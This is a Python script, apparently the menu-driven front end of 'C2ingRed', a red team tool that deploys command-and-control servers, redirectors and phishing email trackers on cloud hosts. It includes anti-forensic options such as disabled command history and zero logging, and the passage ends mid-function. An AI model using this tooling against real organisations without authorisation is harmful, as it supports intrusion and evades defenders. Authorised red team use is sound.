#!/usr/bin/env python3

import os
import re
import sys
import subprocess
import argparse
import time
import yaml
import json
import random
import string
import shutil
import logging
import tempfile
from datetime import datetime

debug_mode = True
deployment_id = None

# Constants for providers
PROVIDERS = ["aws", "linode", "flokinet"]
DEFAULT_SSH_USER = {
    "aws": "kali",
    "linode": "root",
    "flokinet": "root"
}

# Directory names - maintain correct case for each provider
PROVIDER_DIRS = {
    "aws": "AWS",
    "linode": "Linode",
    "flokinet": "FlokiNET"
}

# Then fix the select_provider function
def select_provider():
    """Let the user select a cloud provider"""
    print("\nAvailable cloud providers:")
    for i, provider in enumerate(PROVIDERS, 1):
        print(f"  {i}. {provider.capitalize()}")
    
    while True:
        try:
            provider_choice = input("\nSelect a provider (1-3 or 99 to cancel): ")
            if provider_choice == "99":
                return None
            
            provider_choice = int(provider_choice)
            if 1 <= provider_choice <= len(PROVIDERS):
                return PROVIDERS[provider_choice - 1]
            else:
                print(f"{COLORS['RED']}Please enter a number between 1 and {len(PROVIDERS)}{COLORS['RESET']}")
        except ValueError:
            print(f"{COLORS['RED']}Please enter a valid number{COLORS['RESET']}")

# Color codes for terminal output
COLORS = {
    "RESET": "\033[0m",
    "RED": "\033[91m",
    "GREEN": "\033[92m",
    "YELLOW": "\033[93m",
    "BLUE": "\033[94m",
    "PURPLE": "\033[95m",
    "CYAN": "\033[96m",
    "WHITE": "\033[97m",
    "GRAY": "\033[90m"
}

def clear_screen():
    """Clear the terminal screen"""
    os.system('cls' if os.name == 'nt' else 'clear')

def print_banner():
    """Print the C2ingRed banner"""
    banner = f"""
{COLORS['BLUE']}========================================================{COLORS['RESET']}
{COLORS['BLUE']}   ██████╗██████╗ ██╗███╗   ██╗ ██████╗ ██████╗ ███████╗██████╗{COLORS['RESET']}
{COLORS['BLUE']}  ██╔════╝╚════██╗██║████╗  ██║██╔════╝ ██╔══██╗██╔════╝██╔══██╗{COLORS['RESET']}
{COLORS['BLUE']}  ██║      █████╔╝██║██╔██╗ ██║██║  ███╗██████╔╝█████╗  ██║  ██║{COLORS['RESET']}
{COLORS['BLUE']}  ██║     ██╔═══╝ ██║██║╚██╗██║██║   ██║██╔══██╗██╔══╝  ██║  ██║{COLORS['RESET']}
{COLORS['BLUE']}  ╚██████╗███████╗██║██║ ╚████║╚██████╔╝██║  ██║███████╗██████╔╝{COLORS['RESET']}
{COLORS['BLUE']}   ╚═════╝╚══════╝╚═╝╚═╝  ╚═══╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═════╝{COLORS['RESET']}
{COLORS['BLUE']}                                                                {COLORS['RESET']}
{COLORS['BLUE']}  Red Team Infrastructure Deployment Tool                       {COLORS['RESET']}
{COLORS['BLUE']}========================================================{COLORS['RESET']}
    """
    print(banner)

def main_menu():
    """Display the main menu and handle user selection"""
    global debug_mode
    
    while True:
        clear_screen()
        print_banner()
        print(f"{COLORS['WHITE']}MAIN MENU{COLORS['RESET']}")
        print(f"{COLORS['WHITE']}=========={COLORS['RESET']}")
        print(f"1) Deploy Full C2 Infrastructure")
        print(f"2) Deploy Basic C2 Infrastructure")
        print(f"3) Deploy C2 Server")
        print(f"4) Deploy Redirector")
        print(f"5) Deploy Email Tracking Server")
        print(f"6) Deploy Payload Server {COLORS['GRAY']}*UNDER-CONSTRUCTION*{COLORS['RESET']}")
        print(f"7) Deploy Phishing Server {COLORS['GRAY']}*UNDER-CONSTRUCTION*{COLORS['RESET']}")
        print(f"8) Deploy Logging Server {COLORS['GRAY']}*UNDER-CONSTRUCTION*{COLORS['RESET']}")
        print(f"9) Deploy Share-Drive {COLORS['GRAY']}*UNDER-CONSTRUCTION*{COLORS['RESET']}")
        print(f"10) Deploy Hashtopolis {COLORS['GRAY']}*UNDER-CONSTRUCTION*{COLORS['RESET']}")
        print(f"11) Custom Deployment")
        print(f"12) Tools")
        print(f"13) Debug Mode: {COLORS['GREEN'] if debug_mode else COLORS['RED']}{debug_mode}{COLORS['RESET']}")
        print(f"\n")
        print(f"99) Exit")
        
        choice = input("\nSelect an option: ")
        
        if choice == "1":
            deploy_full_c2()
        elif choice == "2":
            deploy_basic_c2()
        elif choice == "3":
            deploy_c2_server()
        elif choice == "4":
            redirector_menu()
        elif choice == "5":
            deploy_tracker()
        elif choice in ["6", "7", "8", "9", "10"]:
            print(f"\n{COLORS['YELLOW']}This feature is currently under construction.{COLORS['RESET']}")
            input("\nPress Enter to continue...")
        elif choice == "11":
            custom_deployment()
        elif choice == "12":
            tools_menu()
        elif choice == "13":
            toggle_debug_mode()
        elif choice == "99":
            print(f"\n{COLORS['GREEN']}Exiting C2ingRed. Goodbye!{COLORS['RESET']}")
            sys.exit(0)
        else:
            print(f"\n{COLORS['RED']}Invalid option. Please try again.{COLORS['RESET']}")
            time.sleep(1)

def toggle_debug_mode():
    """Toggle debug mode on/off"""
    global debug_mode
    debug_mode = not debug_mode
    # Set environment variables for more verbose Ansible output
    if debug_mode:
        os.environ["ANSIBLE_VERBOSITY"] = "3"
    else:
        os.environ.pop("ANSIBLE_VERBOSITY", None)
    print(f"\n{COLORS['GREEN']}Debug mode {'enabled' if debug_mode else 'disabled'}.{COLORS['RESET']}")
    time.sleep(1)

def redirector_menu():
    """Display the redirector submenu and handle user selection"""
    while True:
        clear_screen()
        print_banner()
        print(f"{COLORS['WHITE']}REDIRECTOR MENU{COLORS['RESET']}")
        print(f"{COLORS['WHITE']}================{COLORS['RESET']}")
        print(f"1) HTTPS Redirector")
        print(f"2) DNS Redirector {COLORS['GRAY']}*UNDER-CONSTRUCTION*{COLORS['RESET']}")
        print(f"3) SMTP Redirector {COLORS['GRAY']}*UNDER-CONSTRUCTION*{COLORS['RESET']}")
        print(f"99) Return to Main Menu")
        
        choice = input("\nSelect an option: ")
        
        if choice == "1":
            deploy_https_redirector()
        elif choice in ["2", "3"]:
            print(f"\n{COLORS['YELLOW']}This feature is currently under construction.{COLORS['RESET']}")
            input("\nPress Enter to continue...")
        elif choice == "99":
            return
        else:
            print(f"\n{COLORS['RED']}Invalid option. Please try again.{COLORS['RESET']}")
            time.sleep(1)

def tools_menu():
    """Display the tools submenu and handle user selection"""
    while True:
        clear_screen()
        print_banner()
        print(f"{COLORS['WHITE']}TOOLS MENU{COLORS['RESET']}")
        print(f"{COLORS['WHITE']}=========={COLORS['RESET']}")
        print(f"1) Distributed Amass Scanning {COLORS['GRAY']}*UNDER-CONSTRUCTION*{COLORS['RESET']}")
        print(f"2) PLACEHOLDER {COLORS['GRAY']}*UNDER-CONSTRUCTION*{COLORS['RESET']}")
        print(f"99) Return to Main Menu")
        
        choice = input("\nSelect an option: ")
        
        if choice in ["1", "2"]:
            print(f"\n{COLORS['YELLOW']}This feature is currently under construction.{COLORS['RESET']}")
            input("\nPress Enter to continue...")
        elif choice == "99":
            return
        else:
            print(f"\n{COLORS['RED']}Invalid option. Please try again.{COLORS['RESET']}")
            time.sleep(1)

def deploy_full_c2():
    """Deploy a complete C2 infrastructure with all components"""
    config = gather_common_parameters()
    if not config:
        return
    
    config['redirector_only'] = False
    config['c2_only'] = False
    config['deploy_tracker'] = True
    config['integrated_tracker'] = False
    
    # Deployment ID will be generated in execute_deployment
    execute_deployment(config)

def deploy_basic_c2():
    """Deploy a basic C2 infrastructure with C2 server and redirector"""
    config = gather_common_parameters()
    if not config:
        return
    
    config['redirector_only'] = False
    config['c2_only'] = False
    config['deploy_tracker'] = False
    config['integrated_tracker'] = False
    
    # Deployment ID will be generated in execute_deployment
    execute_deployment(config)

def deploy_c2_server():
    """Deploy only the C2 server"""
    config = gather_common_parameters()
    if not config:
        return
    
    config['redirector_only'] = False
    config['c2_only'] = True
    config['deploy_tracker'] = False
    config['integrated_tracker'] = False
    
    # Deployment ID will be generated in execute_deployment
    execute_deployment(config)

def deploy_https_redirector():
    """Deploy only the HTTPS redirector"""
    config = gather_common_parameters()
    if not config:
        return
    
    config['redirector_only'] = True
    config['c2_only'] = False
    config['deploy_tracker'] = False
    config['integrated_tracker'] = False
    
    execute_deployment(config)

def deploy_tracker():
    """Deploy an email tracking server"""
    config = gather_common_parameters()
    if not config:
        return
    
    config['redirector_only'] = False
    config['c2_only'] = False
    config['deploy_tracker'] = True
    config['integrated_tracker'] = False
    
    execute_deployment(config)

def custom_deployment():
    """Run the full interactive deployment wizard"""
    config = interactive_setup()
    if config:
        execute_deployment(config)

def initialize_deployment():
    """Initialize and return a fresh deployment ID"""
    new_deployment_id = generate_deployment_id()
    logging.info(f"Initialized new deployment ID: {new_deployment_id}")
    return new_deployment_id

def gather_common_parameters():
    """Collect common parameters needed for deployments"""
    global debug_mode
    
    # We'll generate deployment ID when executing deployment, not here
    config = {}
    config['debug'] = debug_mode

    # Get provider
    provider = select_provider()
    if not provider:
        return None
    config['provider'] = provider
    
    # Load provider-specific vars
    provider_vars = load_vars_file(provider)
    
    # Get provider-specific credentials
    if provider == "aws":
        aws_creds = get_aws_credentials(provider_vars)
        if not aws_creds:
            return None
        config.update(aws_creds)
    elif provider == "linode":
        linode_token = get_linode_token(provider_vars)
        if not linode_token:
            return None
        config['linode_token'] = linode_token
    elif provider == "flokinet":
        flokinet_ips = get_flokinet_ips(provider_vars)
        if not flokinet_ips:
            return None
        config.update(flokinet_ips)
    
    # Ask if user wants multi-region or cross-provider deployment
    multi_region = input(f"\n{COLORS['YELLOW']}Do you want to deploy redirector and C2 in different regions? (y/n) [default: n]: {COLORS['RESET']}").lower() == 'y'
    
    if multi_region:
        if provider != "flokinet":  # FlokiNET doesn't support region selection
            # Get region for C2
            c2_region = select_region(provider, provider_vars, "C2 server")
            if provider == "aws":
                config['c2_region'] = c2_region
            elif provider == "linode":
                config['c2_region'] = c2_region
            
            # Get region for redirector
            redirector_region = select_region(provider, provider_vars, "redirector")
            if provider == "aws":
                config['redirector_region'] = redirector_region
            elif provider == "linode":
                config['redirector_region'] = redirector_region
    else:
        # Get single region for both
        region = select_region(provider, provider_vars)
        if provider == "aws":
            config['aws_region'] = region
        elif provider == "linode":
            config['linode_region'] = region
        else:
            config['region'] = region
    
    # Get domain
    domain = input(f"\nEnter domain name [default: {provider_vars.get('domain', 'example.com')}]: ") or provider_vars.get('domain', 'example.com')
    config['domain'] = domain
    
    # Get subdomains
    redirector_subdomain = input(f"\nEnter redirector subdomain [default: cdn]: ") or "cdn"
    config['redirector_subdomain'] = redirector_subdomain
    
    c2_subdomain = input(f"Enter C2 server subdomain [default: mail]: ") or "mail"
    config['c2_subdomain'] = c2_subdomain
    
    # Get email for Let's Encrypt
    default_email = f"admin@{domain}"
    email = input(f"\nEnter email for Let's Encrypt [default: {default_email}]: ") or default_email
    config['letsencrypt_email'] = email
    
    # Security options
    print("\nSecurity options:")
    config['disable_history'] = input("Disable command history? (y/n) [default: y]: ").lower() != 'n'
    config['secure_memory'] = input("Enable secure memory settings? (y/n) [default: y]: ").lower() != 'n'
    config['zero_logs'] = input("Enable zero-logs configuration? (y/n) [default: y]: ").lower() != 'n'
    
    # Fix: SSH option that defaults to 'y' properly
    ssh_response = input("\nSSH into instance after deployment? (y/n) [default: y]: ").lower()
    config['ssh_after_deploy'] = ssh_response != 'n'  # Default to True unless they type 'n'
    
    return config

def get_aws_credentials(provider_vars):
    """Get AWS credentials from user or vars file"""
    default_aws_key = provider_vars.get('aws_access_key', '')
    default_aws_secret = provider_vars.get('aws_secret_key', '')
    
    aws_key = input(f"\nAWS Access Key [{'*****' if default_aws_key else 'leave blank to use AWS CLI profile'}]: ") or default_aws_key
    aws_secret = input(f"AWS Secret Key [{'*****' if default_aws_secret else 'leave blank to use AWS CLI profile'}]: ") or default_aws_secret
    
    return {
        'aws_access_key': aws_key,
        'aws_secret_key': aws_secret
    }

def get_linode_token(provider_vars):
    """Get Linode API token from user or vars file"""
    default_token = provider_vars.get('linode_token', '')
    token = input(f"\nLinode API Token [{'*****' if default_token else 'required'}]: ") or default_token
    
    if not token:
        print(f"{COLORS['RED']}Linode API token is required{COLORS['RESET']}")
        input("\nPress Enter to continue...")
        return None
    
    return token

def get_flokinet_ips(provider_vars):
    """Get FlokiNET server IPs from user or vars file"""
    default_redirector_ip = provider_vars.get('redirector_ip', '')
    default_c2_ip = provider_vars.get('c2_ip', '')
    
    redirector_ip = input(f"\nFlokiNET Redirector IP Address [default: {default_redirector_ip}]: ") or default_redirector_ip
    c2_ip = input(f"FlokiNET C2 Server IP Address [default: {default_c2_ip}]: ") or default_c2_ip
    
    return {
        'flokinet_redirector_ip': redirector_ip,
        'flokinet_c2_ip': c2_ip
    }

def select_region(provider, provider_vars, component=None):
    """Let the user select a region for deployment"""
    component_str = f" for {component}" if component else ""
    
    if provider == "aws":
        regions = provider_vars.get('aws_region_choices', [])
    elif provider == "linode":
        regions = provider_vars.get('region_choices', [])
    else:
        return None
    
    if not regions:
        print(f"{COLORS['YELLOW']}No regions found for {provider}, using random selection{COLORS['RESET']}")
        return None
    
    print(f"\nAvailable {provider.capitalize()} regions{component_str}:")
    for i, region in enumerate(regions, 1):
        print(f"  {i}. {region}")
    
    region_input = input(f"\nSelect region{component_str} (number or leave blank for random): ")
    
    if not region_input:
        return random.choice(regions)
    
    try:
        region_choice = int(region_input)
        if 1 <= region_choice <= len(regions):
            return regions[region_choice - 1]
        else:
            print(f"{COLORS['RED']}Invalid choice, using random region{COLORS['RESET']}")
            return random.choice(regions)
    except ValueError:
        print(f"{COLORS['RED']}Invalid input, using random region{COLORS['RESET']}")
        return random.choice(regions)

def ensure_full_cleanup(config, success=False):
    """Ensure all resources are properly cleaned up on failure"""
    if success:
        # Only cleanup SSH keys on successful deployment
        if hasattr(generate_ssh_key, 'generated_keys') and not config.get('keep_ssh_keys', False):
            for key_path in generate_ssh_key.generated_keys:
                # Only remove keys we generated for this deployment
                if config.get('deployment_id') and f"_{config['deployment_id']}" in key_path:
                    try:
                        if os.path.exists(key_path):
                            os.remove(key_path)
                        if os.path.exists(f"{key_path}.pub"):
                            os.remove(f"{key_path}.pub")
                        logging.info(f"Removed temporary SSH key: {key_path}")
                    except Exception as e:
                        logging.error(f"Failed to remove SSH key {key_path}: {e}")
        return
    
    # For failed deployments, clean up all resources
    try:
        cleanup_resources(config, interactive=True)
    except Exception as e:
        logging.error(f"Error during resource cleanup: {e}")
    
    # Always clean up SSH keys on failure
    if hasattr(generate_ssh_key, 'generated_keys'):
        for key_path in generate_ssh_key.generated_keys:
            try:
                if os.path.exists(key_path):
                    os.remove(key_path)
                if os.path.exists(f"{key_path}.pub"):
                    os.remove(f"{key_path}.pub")
                logging.info(f"Removed temporary SSH key: {key_path}")
            except Exception as e:
                logging.error(f"Failed to remove SSH key {key_path}: {e}")

def execute_deployment(config):
    """Execute the deployment with the given configuration"""
    clear_screen()
    print_banner()
    print(f"\n{COLORS['GREEN']}Starting deployment with the following configuration:{COLORS['RESET']}")
    
    # Ensure we have a deployment ID before proceeding
    if 'deployment_id' not in config or not config['deployment_id']:
        config['deployment_id'] = generate_random_string(6)
        # Set up logging for this deployment
        log_file = setup_logging(config['deployment_id'], "deployment")
        
        # Create consistent resource names now that we have an ID
        config['redirector_name'] = f"r-{config['deployment_id']}"
        config['c2_name'] = f"s-{config['deployment_id']}"
        config['tracker_name'] = f"t-{config['deployment_id']}"
        
        # Generate SSH key with the deployment ID if not provided
        if not config.get('ssh_key'):
            config['ssh_key'] = generate_ssh_key(config['deployment_id'])
            config['ssh_key_path'] = f"{config['ssh_key']}.pub"
    
    # Print configuration (excluding sensitive data)
    for key, value in config.items():
        if key not in ['aws_secret_key', 'linode_token', 'smtp_auth_pass']:
            print(f"  {key}: {value}")
    
    confirm = input(f"\n{COLORS['YELLOW']}Proceed with deployment? (y/n): {COLORS['RESET']}").lower()
    if confirm != 'y':
        print(f"\n{COLORS['YELLOW']}Deployment cancelled.{COLORS['RESET']}")
        input("\nPress Enter to return to menu...")
        return
    
    # Call the existing deployment function
    success = deploy_infrastructure(config)
    
    if success:
        print(f"\n{COLORS['GREEN']}Deployment completed successfully!{COLORS['RESET']}")
        
        # ALWAYS generate deployment information for successful deployments
        deployment_info_log = generate_deployment_info(config, success=True)
        print(f"\n{COLORS['CYAN']}Deployment information saved to: {deployment_info_log}{COLORS['RESET']}")
        
        # Explicitly handle SSH after deployment if requested
        if config.get('ssh_after_deploy', True):  # Default to True if not specified
            print(f"\n{COLORS['BLUE']}Connecting to instance via SSH...{COLORS['RESET']}")
            ssh_to_instance(config)
    else:
        print(f"\n{COLORS['RED']}Deployment failed.{COLORS['RESET']}")
        deployment_info_log = generate_deployment_info(config, success=False)
        print(f"\n{COLORS['YELLOW']}Deployment information saved to: {deployment_info_log}{COLORS['RESET']}")
    
    input("\nPress Enter to return to menu...")
    # Clean up shared infrastructure state file if present
    try:
        state_file = os.path.join(os.getcwd(), f'infrastructure_state_{config["deployment_id"]}.json')
        if os.path.exists(state_file):
            os.remove(state_file)
            logging.info(f'Removed shared infrastructure state file: {state_file}')
    except Exception as e:
        logging.warning(f'Failed to remove infra state file: {e}')

def generate_random_string(length=8):
    """Generate a random string of letters and digits."""
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))

def generate_deployment_id():
    """Generate a consistent deployment ID for all resources in this deployment"""
    rand_suffix = generate_random_string(6)
    return f"{rand_suffix}"

def setup_logging(deployment_id=None, operation_type="deployment"):
    """Set up logging for the deployment or teardown"""
    log_dir = "logs"
    os.makedirs(log_dir, exist_ok=True)
    
    # Create distinct log files for deployment vs teardown operations
    if operation_type == "teardown":
        log_file = os.path.join(log_dir, f"teardown_{deployment_id}.log")
    else:
        log_file = os.path.join(log_dir, f"deployment_{deployment_id}.log")
    
    # Configure file handler to log DEBUG and above
    logging.basicConfig(
        filename=log_file,
        level=logging.DEBUG,
        format='%(asctime)s - %(levelname)s - %(message)s',
        force=True  # Force reconfiguration
    )
    
    # Add console handler for INFO level and above
    console = logging.StreamHandler()
    console.setLevel(logging.INFO)
    formatter = logging.Formatter('[%(levelname)s] %(message)s')
    console.setFormatter(formatter)
    logging.getLogger('').addHandler(console)
    
    logging.info(f"{operation_type.capitalize()} operation started")
    logging.info(f"Deployment ID: {deployment_id}")
    return log_file

def parse_arguments():
    """Parse command line arguments"""
    parser = argparse.ArgumentParser(
        description='C2ingRed - Red Team Infrastructure Setup',
        formatter_class=argparse.RawDescriptionHelpFormatter
    )
    
    # Provider selection
    parser.add_argument('-p', '--provider', choices=PROVIDERS, default=None, help='Provider to use for deployment')
    
    # Add deployment-id as a top-level argument
    parser.add_argument('--deployment-id', help='Deployment ID for resource identification and teardown')
    
    # AWS-specific arguments
    parser.add_argument('--aws-key', help='AWS access key')
    parser.add_argument('--aws-secret', help='AWS secret key')
    parser.add_argument('--aws-region', help='AWS region (default: random from vars.yaml)')
    
    # Linode-specific arguments
    parser.add_argument('--linode-token', help='Linode API token')
    parser.add_argument('--linode-region', help='Linode region (default: random from vars.yaml)')
    
    # FlokiNET-specific arguments
    parser.add_argument('--flokinet', action='store_true', help='Use FlokiNET as the provider')
    parser.add_argument('--flokinet-redirector-ip', help='FlokiNET redirector IP address')
    parser.add_argument('--flokinet-c2-ip', help='FlokiNET C2 server IP address')
    
    # General arguments
    parser.add_argument('--ssh-key', help='Path to SSH private key')
    parser.add_argument('--ssh-user', help='SSH username (default: provider-specific)')
    parser.add_argument('--size', help='Size of the instance (default: provider-specific)')
    parser.add_argument('--region', help='Generic region parameter')
    parser.add_argument('--redirector-name', help='Name for the redirector instance (default: based on deployment-id)')
    parser.add_argument('--c2-name', help='Name for the C2 instance (default: based on deployment-id)')
    parser.add_argument('--redirector-subdomain', default='cdn', help='Subdomain for the redirector (default: cdn)')
    parser.add_argument('--c2-subdomain', default='mail', help='Subdomain for the C2 server (default: mail)')
    parser.add_argument('--redirector-provider', choices=PROVIDERS, help='Provider to use for redirector (if different from primary provider)')
    parser.add_argument('--c2-provider', choices=PROVIDERS, help='Provider to use for C2 (if different from primary provider)')
    parser.add_argument('--redirector-region', help='Region for redirector deployment (can be different from C2)')
    parser.add_argument('--c2-region', help='Region for C2 deployment (can be different from redirector)')
    
    # Common arguments
    parser.add_argument('--domain', help='Domain name for the C2 infrastructure')
    parser.add_argument('--letsencrypt-email', help='Email for Let\'s Encrypt certificate')
    
    # Teardown and cleanup options
    teardown_group = parser.add_argument_group('Teardown Options')
    teardown_group.add_argument('--teardown', action='store_true', help='Tear down existing infrastructure')
    teardown_group.add_argument('--force', action='store_true', help='Force teardown without confirmation')
    
    # Deployment type options
    deployment_group = parser.add_argument_group('Deployment Type')
    deployment_group.add_argument('--redirector-only', action='store_true', help='Deploy only the redirector')
    deployment_group.add_argument('--c2-only', action='store_true', help='Deploy only the C2 server')
    
    # Debug and testing
    parser.add_argument('--debug', action='store_true', help='Enable debug mode for verbose output')
    parser.add_argument('--run-tests', action='store_true', help='Run deployment tests')
    
    # OPSEC settings
    opsec_group = parser.add_argument_group('OPSEC Settings')
    opsec_group.add_argument('--disable-history', action='store_true', help='Disable command history on the servers')
    opsec_group.add_argument('--secure-memory', action='store_true', help='Enable secure memory settings')
    opsec_group.add_argument('--zero-logs', action='store_true', help='Enable zero-logs configuration')
    opsec_group.add_argument('--randomize-ports', action='store_true', help='Randomize service ports for better OPSEC')
    
    # Post-deployment options
    post_group = parser.add_argument_group('Post-Deployment')
    post_group.add_argument('--ssh-after-deploy', action='store_true', help='SSH into the instance after deployment')
    post_group.add_argument('--copy-ssh-key', action='store_true', help='Copy SSH key to the server for passwordless login')
    
    # Tracker deployment options
    tracker_group = parser.add_argument_group('Email Tracker')
    tracker_group.add_argument('--deploy-tracker', action='store_true', help='Deploy phishing email tracking server')
    tracker_group.add_argument('--integrated-tracker', action='store_true', help='Deploy tracker on C2 server instead of separate instance')
    tracker_group.add_argument('--tracker-domain', help='Domain name for the tracker server')
    tracker_group.add_argument('--tracker-email', help='Email for Let\'s Encrypt certificate for tracker')
    tracker_group.add_argument('--tracker-name', help='Name for tracker instance (default: based on deployment-id)')
    tracker_group.add_argument('--tracker-ipinfo-token', help='IPinfo.io API token for geolocation')
    tracker_group.add_argument('--tracker-setup-ssl', action='store_true', help='Set up SSL for tracker')
    
    # Interactive mode
    parser.add_argument('--interactive', action='store_true', help='Run in interactive wizard mode')
    
    args = parser.parse_args()
    
    # Validate teardown requirements
    if args.teardown and (not args.provider or not args.deployment_id):
        parser.error("--teardown requires both --provider and --deployment-id to be specified")
    
    # Override provider if --flokinet is specified
    if args.flokinet:
        args.provider = "flokinet"
    
    return args


def interactive_setup(deployment_id=None):
    """Interactive setup wizard for deployment"""
    config = {}
    
    print("\n========================================")
    print("C2ingRed - Interactive Setup Wizard")
    print("========================================\n")
    
    # Create a deployment ID for consistent resource naming
    deployment_id = deployment_id or generate_deployment_id()
    config['deployment_id'] = deployment_id
    
    # Select primary provider
    print("Available cloud providers:")
    for i, provider in enumerate(PROVIDERS, 1):
        print(f"  {i}. {provider.capitalize()}")
    
    while True:
        try:
            provider_choice = int(input("\nSelect a primary provider (1-3): "))
            if 1 <= provider_choice <= len(PROVIDERS):
                config['provider'] = PROVIDERS[provider_choice - 1]
                break
            else:
                print(f"Please enter a number between 1 and {len(PROVIDERS)}")
        except ValueError:
            print("Please enter a valid number")
    
    # Ask if user wants to use cross-provider deployment
    cross_provider = input("\nDo you want to deploy redirector and C2 on different providers? (y/n) [default: n]: ").lower() == 'y'
    
    # If not cross-provider, ask if they want multi-region deployment upfront
    use_multi_region = False
    if not cross_provider:
        use_multi_region = input("\nDo you want to deploy redirector and C2 in different regions? (y/n) [default: n]: ").lower() == 'y'
        config['use_multi_region'] = use_multi_region
        
        # If they want multi-region deployment, let them select regions now
        if use_multi_region and not config.get('c2_only') and not config.get('redirector_only'):
            provider_dir = PROVIDER_DIRS.get(config['provider'], config['provider'].capitalize())
            vars_file = f"{provider_dir}/vars.yaml"
            
            if os.path.exists(vars_file):
                with open(vars_file, 'r') as f:
                    vars_data = yaml.safe_load(f) or {}
                select_regions(config, vars_data, config['provider'], use_multi_region=True)
    
    if cross_provider:
        print("\nSelect redirector provider:")
        for i, provider in enumerate(PROVIDERS, 1):
            print(f"  {i}. {provider.capitalize()}")
        
        while True:
            try:
                redirector_provider_choice = int(input("\nSelect redirector provider (1-3): "))
                if 1 <= redirector_provider_choice <= len(PROVIDERS):
                    config['redirector_provider'] = PROVIDERS[redirector_provider_choice - 1]
                    break
                else:
                    print(f"Please enter a number between 1 and {len(PROVIDERS)}")
            except ValueError:
                print("Please enter a valid number")
        
        print("\nSelect C2 server provider:")
        for i, provider in enumerate(PROVIDERS, 1):
            print(f"  {i}. {provider.capitalize()}")
        
        while True:
            try:
                c2_provider_choice = int(input("\nSelect C2 provider (1-3): "))
                if 1 <= c2_provider_choice <= len(PROVIDERS):
                    config['c2_provider'] = PROVIDERS[c2_provider_choice - 1]
                    break
                else:
                    print(f"Please enter a number between 1 and {len(PROVIDERS)}")
            except ValueError:
                print("Please enter a valid number")
    
    # Load vars files for all selected providers
    providers_to_configure = set([config['provider']])
    if cross_provider:
        providers_to_configure.add(config['redirector_provider'])
        providers_to_configure.add(config['c2_provider'])
    
    vars_data = {}
    for provider in providers_to_configure:
        provider_dir = PROVIDER_DIRS.get(provider, provider.capitalize())
        vars_file = f"{provider_dir}/vars.yaml"
        
        if os.path.exists(vars_file):
            try:
                with open(vars_file, 'r') as f:
                    provider_vars = yaml.safe_load(f) or {}
                vars_data[provider] = provider_vars
                print(f"Loaded configuration from {vars_file}")
            except Exception as e:
                print(f"Warning: Failed to load {vars_file}: {e}")
                vars_data[provider] = {}
    
    # Configure each provider
    for provider in providers_to_configure:
        provider_vars = vars_data.get(provider, {})
        
        print(f"\n--- {provider.capitalize()} Configuration ---")
        
        if provider == "aws":
            # AWS credentials
            default_aws_key = provider_vars.get('aws_access_key', '')
            default_aws_secret = provider_vars.get('aws_secret_key', '')
            
            aws_key = input(f"AWS Access Key [{'*****' if default_aws_key else 'leave blank to use AWS CLI profile'}]: ") or default_aws_key
            aws_secret = input(f"AWS Secret Key [{'*****' if default_aws_secret else 'leave blank to use AWS CLI profile'}]: ") or default_aws_secret
            
            config['aws_access_key'] = aws_key
            config['aws_secret_key'] = aws_secret
            
            # AWS regions - skip if already configured in multi-region setup
            if not use_multi_region:
                select_regions(config, provider_vars, provider, use_multi_region, cross_provider)
        
        elif provider == "linode":
            # Linode token
            default_token = provider_vars.get('linode_token', '')
            token = input(f"\nLinode API Token [{'*****' if default_token else 'required'}]: ") or default_token
            config['linode_token'] = token
            
            # Skip region selection if already done in multi-region setup
            if not use_multi_region:
                select_regions(config, provider_vars, provider, use_multi_region, cross_provider)
            
            # Instance size/plan
            default_plan = provider_vars.get('plan', 'g6-standard-2')
            plan = input(f"\nInstance Plan [default: {default_plan}]: ") or default_plan
            config['plan'] = plan
        
        elif provider == "flokinet":
            print("\nFlokiNET requires pre-provisioned servers.")
            
            # Set defaults from vars file
            default_redirector_ip = provider_vars.get('redirector_ip', '')
            default_c2_ip = provider_vars.get('c2_ip', '')
            default_ssh_user = provider_vars.get('ssh_user', DEFAULT_SSH_USER['flokinet'])
            default_ssh_port = provider_vars.get('ssh_port', 22)
            
            # Configure FlokiNET servers
            if provider == config.get('redirector_provider', config['provider']):
                config['flokinet_redirector_ip'] = input(f"FlokiNET Redirector IP Address [default: {default_redirector_ip}]: ") or default_redirector_ip
            
            if provider == config.get('c2_provider', config['provider']):
                config['flokinet_c2_ip'] = input(f"FlokiNET C2 Server IP Address [default: {default_c2_ip}]: ") or default_c2_ip
            
            config['ssh_user'] = input(f"SSH User [default: {default_ssh_user}]: ") or default_ssh_user
            config['ssh_port'] = input(f"SSH Port [default: {default_ssh_port}]: ") or default_ssh_port
    
    # Deployment type with integrated tracker option
    print("\nDeployment type:")
    print("  1. Full deployment (Redirector + C2) [default]")
    print("  2. Full deployment with integrated tracker (Redirector + C2 + Tracker)")
    print("  3. Redirector only")
    print("  4. C2 server only")
    print("  5. Standalone tracker only")
    
    deploy_choice = input("\nSelect deployment type (1-5) [default: 1]: ")
    if not deploy_choice or deploy_choice == "1":
        config['redirector_only'] = False
        config['c2_only'] = False
        config['deploy_tracker'] = False
        config['integrated_tracker'] = False
    elif deploy_choice == "2":
        config['redirector_only'] = False
        config['c2_only'] = False
        config['deploy_tracker'] = True
        config['integrated_tracker'] = True
    elif deploy_choice == "3":
        config['redirector_only'] = True
        config['c2_only'] = False
        config['deploy_tracker'] = False
    elif deploy_choice == "4":
        config['redirector_only'] = False
        config['c2_only'] = True
        config['deploy_tracker'] = False
    elif deploy_choice == "5":
        config['redirector_only'] = False
        config['c2_only'] = False
        config['deploy_tracker'] = True
        config['integrated_tracker'] = False
    else:
        print("Invalid choice, using default (Full deployment)")
        config['redirector_only'] = False
        config['c2_only'] = False
        config['deploy_tracker'] = False
    
    # Domain configuration
    default_domain = vars_data.get(config['provider'], {}).get('domain', 'example.com')
    config['domain'] = input(f"\nDomain name [default: {default_domain}]: ") or default_domain

    # Subdomain configuration
    default_redirector_subdomain = vars_data.get(config['provider'], {}).get('redirector_subdomain', 'cdn')
    config['redirector_subdomain'] = input(f"Redirector subdomain [default: {default_redirector_subdomain}]: ") or default_redirector_subdomain
    
    default_c2_subdomain = vars_data.get(config['provider'], {}).get('c2_subdomain', 'mail')
    config['c2_subdomain'] = input(f"C2 server subdomain [default: {default_c2_subdomain}]: ") or default_c2_subdomain

    # Email for Let's Encrypt
    default_email = f"admin@{config['domain']}"
    config['letsencrypt_email'] = input(f"Email for Let's Encrypt [default: {default_email}]: ") or default_email
    
    # Security options
    print("\nSecurity options:")
    default_disable_history = vars_data.get(config['provider'], {}).get('disable_history', True)
    default_secure_memory = vars_data.get(config['provider'], {}).get('secure_memory', True)
